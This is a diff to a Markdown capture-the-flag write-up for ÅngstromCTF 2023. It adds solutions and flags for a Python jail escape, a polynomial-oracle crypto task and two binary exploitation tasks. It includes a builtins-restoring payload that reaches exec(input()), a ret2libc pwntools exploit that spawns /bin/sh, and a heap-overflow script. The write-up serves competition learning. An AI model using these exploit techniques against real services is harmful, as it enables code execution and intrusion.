@@ -87,7 +87,11 @@ conn.close()
 > _With the power of ARTIFICIAL INTELLIGENCE, I can replace myself!! Ask your questions to this guy, instead._<br>
 > _https://xxxxx.actf.co/_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+DISCLAIMER: the born2scan disassociates itself from any kind of bullying or verbal violence! _against humans :)_{: .spoiler}
+
+![better_me](/assets/img/AngstromCTF_2023/better_me.png)
+
+🏁 _actf{i_wouldnt_leak_the_flag_4f9a6ec9}_{: .spoiler}
 
 ## Obligatory
 
@@ -95,7 +99,42 @@ conn.close()
 > _nc challs.actf.co xxxxx_<br>
 > _Attachments: jail.py, Dockerfile_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+This challenge was very difficult but at the same time gave me great satisfaction in solving it. Before this challenge I was totally inexperienced about pyjails so I decided to read a lot of writeups of past challenges to get an idea of common solutions. After a few hours of reading I learnt many methods to bypass filters and constraints but nothing usable for this challenge. We are provided with the following source code:
+
+```c:source.c
+#!/usr/local/bin/python
+cod = input("sned cod: ")
+
+if any(x not in "q(jw=_alsynxodtg)feum'zk:hivbcpr" for x in cod):
+    print("bad cod")
+else:
+    try:
+        print(eval(cod, {"__builtins__": {"__import__": __import__}}))
+    except Exception as e:
+        print("oop", e)
+```
+
+We can only use lowercase letters and these `()=:'` symbols. Moreover we do not have any builtins except for \_\_import\_\_. So we need to overcome three main constraints:
+- Get access again to the builtins (or find another way around)
+- Execute multiple instructions without `;` or `\n`
+- Get a RCE without using the `.` to call functions
+
+The first constraint alone is easy to bypass because we can import whatever we want, also the builtins. But obviously this alone is not sufficient. I spent a lot time thinking to what we could do with `:` symbol and I came up with two things: walrus operator and lambda functions. I felt that I was on the right path but I didn't manage to put everything together. So I decided to focus on searching a method to execute multiple expressions only with `()=:'`. After a while something clicked and I realized that I could use the `==` operator to execute multple expressions! Furthermore with the walrus operator we can assign inside expressions. So I thought I had the solution and tried with: 
+
+```python
+(__builtins__:=__import__('os'))==print('test')
+```
+
+But it failed :( (oop name 'print' is not defined). \\
+I was still missing something. At that point I was so close (and desperate) that I tried everything I could, ending up with this solution using a lambda function:
+
+```python
+(__builtins__:=__import__('builtins'))==(lambda:exec(input()))()
+```
+
+So after the CTF, while reading other writeups, I found out why this works: in python 3.10+, functions store their own builtins, which are pulled from globals["__builtins__"] when the function is created, meaning the lambda can use the modified builtins.
+
+🏁 _actf{c0uln7_g3t_1t_7o_w0rk_0n_python39_s4dge}_{: .spoiler}
 
 # Web
 
@@ -731,7 +770,134 @@ y will be (2 ** 64)-1, since its binary representation is:
 > _nc challs.actf.co xxxxx_<br>
 > _Attachments: lazylagrange.py_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+The challenge provide us with the source code of the challenge. 
+
+```python:source.py
+#!/usr/local/bin/python
+import random
+
+with open('flag.txt', 'r') as f:
+    FLAG = f.read()
+
+assert all(c.isascii() and c.isprintable() for c in FLAG), 'Malformed flag'
+N = len(FLAG)
+assert N <= 18, 'I\'m too lazy to store a flag that long.'
+p = None
+a = None
+M = (1 << 127) - 1  # 2^127-1
+
+
+def query1(s):
+    if len(s) > 100:
+        return 'I\'m too lazy to read a query that long.'
+    x = s.split()
+    if len(x) > 10:
+        return 'I\'m too lazy to process that many inputs.'
+    if any(not x_i.isdecimal() for x_i in x):
+        return 'I\'m too lazy to decipher strange inputs.'
+    x = (int(x_i) for x_i in x)
+    global p, a
+    # shuffle the range 1-N
+    p = random.sample(range(N), k=N)
+    # shuffle flag with char as int
+    a = [ord(FLAG[p[i]]) for i in range(N)]
+    res = ''
+    for x_i in x:
+        res += f'{sum(a[j] * x_i ** j for j in range(N)) % M}\n'
+    return res
+
+
+# Compute sum(a[j])
+query1('0')
+
+
+def query2(s):
+    if len(s) > 100:
+        return 'I\'m too lazy to read a query that long.'
+    x = s.split()
+    if any(not x_i.isdecimal() for x_i in x):
+        return 'I\'m too lazy to decipher strange inputs.'
+    x = [int(x_i) for x_i in x]
+    # pad input with 0
+    while len(x) < N:
+        x.append(0)
+    z = 1
+    for i in range(N):
+        z *= not x[i] - a[i]
+    return ' '.join(str(p_i * z) for p_i in p)
+
+
+while True:
+    try:
+        choice = int(input(": "))
+        assert 1 <= choice <= 2
+        match choice:
+            case 1:
+                print(query1(input("\t> ")))
+            case 2:
+                print(query2(input("\t> ")))
+    except Exception as e:
+        print("Bad input, exiting", e)
+        break
+```
+
+We can perform two queries:
+- Query1: allow us to send one (or more) integer `x` and it computes the value of $$p(x)=\Sigma_{i=0}^{17} a_i \cdot x^i
+$$ 
+  where the $a_i$ are the ascii decimal values of the flag's characters.
+- Query2: allow us to to send 18 integres values and if these are equal to the coefficients $a_i$ used in Query1 it prints their position in the flag.
+
+So the query1 must be used to recover the flag characters and the query2 to recover their correct order.
+My first idea was to use Langrange interpolation to find the coefficients $a_i$ but in query1 we can provide only 10 points and the flag has length=18, so we have not enough points to interpolate correctly. Then I realized that if I found a number $k$ such that:
+$$
+k^n > \Sigma_{i=0}^{n-1} 127*k^i \\
+\forall n \in [1,17]
+$$
+then I would have been able to recover all the $a_i$. This is done, for each $a_i$, by subtracting from $p(k)$ the possible $a_{i_j}k^i$ ($j \in [0,127]$); the right $a_{i_j}$ is the highest such that $p(k)-a_{i_j}k^i \ge 0$. 
+Moreover we need that $p(k) \le M$ where $M=2^{127}-1$. A $k$ that satisfy all the constraints is `130`.
+
+```python:solve.py
+from pwn import *
+
+
+def solve():
+    r = remote('challs.actf.co', 32100)
+
+    r.sendlineafter(': ', b'1')
+    r.sendlineafter('> ', b'130')
+
+    tot = int(r.recvline().strip().decode())
+    tmp = tot
+
+    coeff = []
+    for i in range(18):
+        for j in range(128):
+            x = 130**(17-i)
+            if tot-(x*j) <= 0:
+                coeff.append(j-1)
+                tot -= x*(j-1)
+                break
+
+    coeff = coeff[::-1]
+    coeff[0] += 1
+    res = sum(coeff[j] * 130 ** j for j in range(18))
+
+    assert res == tmp
+    payload = (' '.join([str(i) for i in coeff])).encode()
+
+    r.sendlineafter(': ', b'2')
+    r.sendlineafter('> ', payload)
+
+    order = [int(i) for i in r.recvline().strip().decode().split()]
+    print(order)
+    print([chr(i) for i in coeff])
+    print(''.join([chr(i[1]) for i in sorted(zip(order, coeff))]))
+
+
+solve()
+```
+
+🏁 _actf{f80f6086a77b}_{: .spoiler}
 
 ## Royal Society of Arts
 
@@ -1061,7 +1227,7 @@ print(flag)
 If the input string is too long it overwrite the flag in the stack, so we have to take it piece by piece. The code above take 8 chars of the flag at every iteration and put them in the variable flag. At the end we only clean the output.
 
 
-🏁 _<actf{st4ck_it_queue_it_a619ad974c864b22}>_{: .spoiler}
+🏁 _actf{st4ck_it_queue_it_a619ad974c864b22}_{: .spoiler}
 
 ## gaga
 
@@ -1069,14 +1235,200 @@ If the input string is too long it overwrite the flag in the stack, so we have t
 > _nc challs.actf.co xxxxx, xxxx, xxxx_<br>
 > _Attachments: gaga0, gaga1, gaga2, Dockerfile_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+```c:source.c
+void main(void)
+
+{
+  char local_48 [60];
+  __gid_t local_c;
+  
+  setbuf(stdout,(char *)0x0);
+  local_c = getegid();
+  setresgid(local_c,local_c,local_c);
+  puts("Awesome! Now there\'s no system(), so what will you do?!");
+  printf("Your input: ");
+  gets(local_48);
+  return;
+}
+```
+
+Nothing much to say about this challenge, it's a classic ret2libc attack. We leak the libc through puts, we find the correct version of libc on [libc database](https://libc.rip/) and then we call `system("/bin/sh")`.
+
+```python:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./gaga2_patched")
+libc = ELF("./libc.so.6")
+context.binary = exe
+context.terminal = ['terminator', '-x']
+
+# context.log_level = 'debug'
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+    elif args.GDB:
+        r = gdb.debug([exe.path], gdbscript='''b *main+116''')
+    else:
+        r = remote("challs.actf.co", 31302)
+
+    return r
+
+
+def main():
+    r = conn()
+
+    offset = 72
+    pop_rdi = p64(0x00000000004012b3)
+    ret = p64(0x000000000040101a)
+    
+    payload = b'a'*offset + pop_rdi + \
+        p64(exe.got.printf) + p64(exe.sym.puts) + p64(exe.sym.main)
+    r.sendlineafter(b': ', payload)
+
+    leak = u64(r.recvline().strip().ljust(8, b'\x00'))
+
+    libc.address = leak - libc.sym.printf
+    print(hex(libc.address))
+
+    payload = b'a'*offset + ret + pop_rdi + \
+        p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
+    r.sendlineafter(b': ', payload)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+🏁 _actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}_{: .spoiler}
 
 ## leek
 
 > _nc challs.actf.co xxxxx_<br>
 > _Attachments: leek, Dockerfile_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+Again, we analyze the binary file with Ghidra.
+
+```c:source
+void main(void)
+{
+  __gid_t __rgid;
+  int iVar1;
+  time_t seed;
+  char *my_input;
+  char *random_bytes;
+  long in_FS_OFFSET;
+  int i;
+  int j;
+  char second_input [40];
+  long canary;
+  
+  canary = *(long *)(in_FS_OFFSET + 0x28);
+  seed = time((time_t *)0x0);
+  srand((uint)seed);
+  setbuf(stdout,(char *)0x0);
+  setbuf(stdin,(char *)0x0);
+  __rgid = getegid();
+  setresgid(__rgid,__rgid,__rgid);
+  puts("I dare you to leek my secret.");
+  i = 0;
+  while( true ) {
+    if (99 < i) {
+      puts("Looks like you made it through.");
+      win();
+      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
+        __stack_chk_fail();
+      }
+      return;
+    }
+    my_input = (char *)malloc(0x10);
+    random_bytes = (char *)malloc(0x20);
+    memset(random_bytes,0,0x20);
+    getrandom(random_bytes,0x20,0);
+    for (j = 0; j < 32; j = j + 1) {
+      if ((random_bytes[j] == '\0') || (random_bytes[j] == '\n')) {
+        random_bytes[j] = '\x01';
+      }
+    }
+    printf("Your input (NO STACK BUFFER OVERFLOWS!!): ");
+    input(my_input);
+    printf(":skull::skull::skull: bro really said: ");
+    puts(my_input);
+    printf("So? What\'s my secret? ");
+    fgets(second_input,33,stdin);
+    iVar1 = strncmp(random_bytes,second_input,0x20);
+    if (iVar1 != 0) break;
+    puts("Okay, I\'ll give you a reward for guessing it.");
+    printf("Say what you want: ");
+    gets(my_input);
+    puts("Hmm... I changed my mind.");
+    free(random_bytes);
+    free(my_input);
+    puts("Next round!");
+    i = i + 1;
+  }
+  puts("Wrong!");
+  exit(-1);
+}
+```
+
+First thing we notice is the presence of a win function, which is called if we manage to pass 100 cycles of the while loop. The program asks us to guess a random generated number to pass each round, that is clearly impossible. The challenge gives us a little suggestion on how to exploit it by printing `(NO STACK BUFFER OVERFLOWS!!)`. \\
+The solution is indeed to perform a heap overflow, since our input and the random bytes to be guesssed are both allocated in the heap. We can overflow because of the `fgets(buf,0x500,stdin);` inside the input function, therefore we can overwrite the random bytes with whatever we want and then guess. \\
+The last problem to solve is to don't make the program crash on the free instructions. This happens because when we overflow the heap we also overwrite its metadata, leading to the `free` failure.
+
+![leek](/assets/img/AngstromCTF_2023/leek.png)
+
+As we can see in the picture above the metadata of the random bytes memory chunk are overwritten. Luckily we can fix up the metadata with another overflow (`gets(my_input);`) after the guess. 
+
+```python:solve.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./leek")
+
+context.binary = exe
+context.terminal = ['terminator', '-x']
+
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+    elif args.GDB:
+        r = gdb.debug([exe.path], gdbscript='''
+                      b *main+512
+                      c
+                      ''')
+    else:
+        r = remote("challs.actf.co", 31310)
+
+    return r
+
+
+def main():
+    r = conn()
+    l = log.progress('i')
+    for i in range(100):
+        l.status(str(i))
+        r.sendlineafter(b': ', b'a'*64)
+        r.sendafter(b'secret? ', b'a'*32)
+
+        payload = b'\x01'*24 + p64(0x31)+b'\x01'*32
+        r.sendlineafter(b': ', payload)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+🏁 _actf{very_133k_of_y0u_777522a2c32b7dd6}_{: .spoiler}
 
 ## widget
 
